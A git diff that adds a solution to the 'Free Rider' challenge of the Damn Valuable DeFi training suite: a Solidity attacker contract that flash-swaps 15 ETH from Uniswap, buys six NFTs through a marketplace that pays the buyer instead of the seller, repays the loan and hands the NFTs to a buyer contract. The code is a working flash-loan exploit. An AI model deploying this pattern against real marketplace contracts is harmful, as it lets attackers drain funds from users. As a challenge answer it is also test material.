@@ -13,6 +13,72 @@ import {DamnValuableNFT} from "../../../Contracts/DamnValuableNFT.sol";
 import {DamnValuableToken} from "../../../Contracts/DamnValuableToken.sol";
 import {WETH9} from "../../../Contracts/WETH9.sol";
 
+import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";
+
+interface IUniswapV2Callee {
+    function uniswapV2Call(
+        address sender,
+        uint256 amount0,
+        uint256 amount1,
+        bytes calldata data
+    ) external;
+}
+
+contract AttackerContract is IUniswapV2Callee, IERC721Receiver {
+    IUniswapV2Pair internal immutable uniPair;
+    WETH9 internal immutable weth;
+    FreeRiderNFTMarketplace internal marketPlace;
+    DamnValuableNFT internal nft;
+    FreeRiderBuyer internal freeRiderBuyer;
+
+    uint256[] internal tokenIds = [0, 1, 2, 3, 4, 5];
+
+    constructor(
+        IUniswapV2Pair _uniPair,
+        FreeRiderNFTMarketplace _marketPlace,
+        FreeRiderBuyer _freeRiderBuyer
+    ) public {
+        uniPair = _uniPair;
+        weth = WETH9(payable(uniPair.token1()));
+        marketPlace = _marketPlace;
+        nft = marketPlace.token();
+        freeRiderBuyer = _freeRiderBuyer;
+    }
+
+    function attack() external {
+        // 1st borrow 15 ETH from Uniswap
+        uniPair.swap(0, 15 ether, address(this), new bytes(1));
+    }
+
+    function uniswapV2Call(
+        address sender,
+        uint256 amount0,
+        uint256 amount1,
+        bytes calldata data
+    ) external override {
+        weth.withdraw(amount1);
+        marketPlace.buyMany{value: address(this).balance}(tokenIds);
+        weth.deposit{value: address(this).balance}();
+        // repay the loan
+        weth.transfer(address(uniPair), weth.balanceOf(address(this)));
+        // tansfer all the NFTs to the buyer
+        for (uint256 i = 0; i < tokenIds.length; i++) {
+            nft.safeTransferFrom(address(this), address(freeRiderBuyer), i);
+        }
+    }
+
+    function onERC721Received(
+        address,
+        address,
+        uint256 _tokenId,
+        bytes memory
+    ) external override returns (bytes4) {
+        return IERC721Receiver.onERC721Received.selector;
+    }
+
+    receive() external payable {}
+}
+
 contract FreeRider is DSTest, stdCheats {
     Vm internal immutable vm = Vm(HEVM_ADDRESS);
 
@@ -155,6 +221,20 @@ contract FreeRider is DSTest, stdCheats {
     function testExploit() public {
         /** EXPLOIT START **/
 
+        // The vulnerability is caused by a bug in the marketPlace's _buyOne(...) method.
+        // In this method seller address is mistakenly confused with buyer's.
+        // This allows the attacker to "buy" the NFTs for 15 ETH and immediately thereafter
+        // the 15 ETH is sent back to him.
+        vm.startPrank(attacker, attacker);
+
+        AttackerContract attackerContract = new AttackerContract(
+            uniswapV2Pair,
+            freeRiderNFTMarketplace,
+            freeRiderBuyer
+        );
+        attackerContract.attack();
+
+        vm.stopPrank();
         /** EXPLOIT END **/
         validation();
     }
